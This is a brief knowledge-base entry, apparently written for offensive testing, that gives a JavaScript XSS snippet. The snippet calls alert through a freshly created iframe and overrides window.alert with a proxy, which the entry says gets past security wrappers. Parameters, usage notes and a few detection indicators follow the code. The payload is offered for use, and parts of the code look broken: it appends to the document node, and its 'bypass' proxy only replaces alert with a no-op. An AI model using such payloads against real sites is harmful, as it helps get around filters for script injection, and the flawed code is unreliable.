---
id: db2d1e4c-4f12-494d-8370-6d16823892b3
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:42.768697+00:00'
updated_at: '2023-04-10T20:21:46.075934+00:00'
tags:
  - xss
  - iframe
  - proxy
platforms:
  - Web
  - Browser
validated: true
---

# XSS-Alert-Bypass-Using-Iframe-and-Proxy

## Code

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

## Description

Creates an iframe to execute alert in an isolated context and defines a proxy to override window.alert, bypassing security wrappers or direct call blocks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 1 | Alert argument in iframe | 1 |
| false | exec_original flag to skip original execution | false |

## Usage

Append iframe for immediate alert, then apply proxy for sustained bypass in the main window.

## Detection

- Dynamic iframe creation without src.
- Proxy function overrides on global objects.
- Lockdown attempts on functions.

## Related

- [[procedures/Bypass-XSS-Alert-Filter-Using-Alternate-Functions]]
